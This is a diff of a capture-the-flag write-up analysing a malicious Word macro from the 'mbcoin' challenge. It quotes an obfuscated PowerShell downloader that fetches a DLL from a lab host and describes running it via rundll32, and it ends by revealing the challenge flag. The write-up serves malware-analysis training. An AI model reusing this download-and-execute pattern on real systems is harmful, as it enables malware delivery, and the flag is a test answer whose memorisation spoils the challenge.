@@ -25,14 +25,14 @@ Monkey Business Investments
 https://i.imgur.com/i24NXcT.png
 
 The document had a macro that was set to run on AutoOpen (when document is loaded).
-[https://i.imgur.com/pajYgdX.png]https://i.imgur.com/pajYgdX.png
+https://i.imgur.com/pajYgdX.png
 
 Analyzed the VBA code, it looks to take 2 strings from the document somewhere (`ActiveDocument.Shapes(1)` and `(2)`) and write them to a file c:\\ProgramData\\pin.vbs, then execute it with: `cmd /k cscript.exe c:\ProgramData\pin.vbs`
 
 When unzipping the .doc file with 7-zip I found a few other files that did not show up the first time, when using linux unzip.  Not sure why this was:
 https://i.imgur.com/2x1RuiS.png
 
-Inside the 1Table file, found plenty of VBA code with obfuscated Powershell commands. This looks to be the contents of the pin.vba:
+Inside the 1Table file, found plenty of VBA code with obfuscated Powershell commands. This looks to be the contents of the pin.vbs:
 ```
  L L 1   =   " $ N a n o = ' J O O E X ' . r e p l a c e ( ' J O O ' , ' I ' ) ; s a l   O Y   $ N a n o ; $ a a = ' ( N e w - O b ' ;   $ q q = ' j e c t   N e ' ;   $ w w = ' t . W e b C l i ' ;   $ e e = ' e n t ) . D o w n l ' ;   $ r r = ' o a d F i l e ' ;   $ b b = ' ( ' ' h t t p : / / p r i y a c a r e e r s . h t b / u 9 h D Q N 9 Y y 7 g / p t . h t m l ' ' , ' ' C : \ P r o g r a m D a t a \ w w w 1 . d l l ' ' ) ' ; $ F O O X   = ( $ a a , $ q q , $ w w , $ e e , $ r r , $ b b , $ c c   - J o i n   ' ' ) ;   O Y   $ F O O X | O Y ; " 
  
@@ -72,8 +72,8 @@ Inside the 1Table file, found plenty of VBA code with obfuscated Powershell comm
  At the bottom of the code, the only dll that appears to actually be run is www.dll.  So it looks like the last file that successfully downloads is the actual www.dll, the others are never run. Looks like it loads a function 'ldr'.
 
 I then uploaded the mbcoin.doc file to an online sandbox, https://any.run so I could watch it explode and capture any other possible clues easily, even though the domains it reaches out to don't look to exist in the real world.  Noticed the last step is the execution of rundll32.exe www.dll,ldr file just as I expected.
-[https://app.any.run/tasks/95061781-61c3-4dd6-bf3e-e5fcea6db905](https://app.any.run/tasks/95061781-61c3-4dd6-bf3e-e5fcea6db905 "https://app.any.run/tasks/95061781-61c3-4dd6-bf3e-e5fcea6db905")
-[https://i.imgur.com/cZsoNq7.png]https://i.imgur.com/cZsoNq7.png
+https://app.any.run/tasks/95061781-61c3-4dd6-bf3e-e5fcea6db905
+https://i.imgur.com/cZsoNq7.png
 
 ### mbcoin.pcapng
 **mbcoin.pcapng** is a packet capture file.  Therer were 4 different IPv4 conversations in total- 
@@ -110,7 +110,7 @@ Saved these files from 2) and 4) to vm.html and pt.html, by extracting all files
 
 Copied/modified some of the powershell to decrypt the files and save them:
 
-(Thanks to my co-worker Aaron for noticing the keys ARE different, explaining why my files were not ever decrypting quite properly!)
+(Thanks to my co-worker Aaron for noticing the keys ARE different, by a couple characters in the middle, explaining why my files were not ever decrypting quite properly!)
 
 ```
 $dir="C:\temp\mbcoin"
@@ -144,6 +144,6 @@ Ended up opening Ghidra to see what each dll does.  In www1.dll there was a note
 In www4.dll, I browsed to the ldr function, and found the flag:
 https://i.imgur.com/Fbxr43I.png
 
-Overall this challenge took me way longer than expected, as first I could not find the contents of pin.vbs since I was using linux unzip instead of 7-zip, and all my other oletools etc did not show it either, until I was able to see it in any.run (sandbox).
+Overall this challenge took me way longer than expected, as first I could not find the contents of pin.vbs since I was using linux unzip instead of 7-zip, and all my other attempts with oletools did not show it either, until I was able to see it in any.run (sandbox).
 
 HTB{wH4tS_4_sQuirReLw4fFl3?}
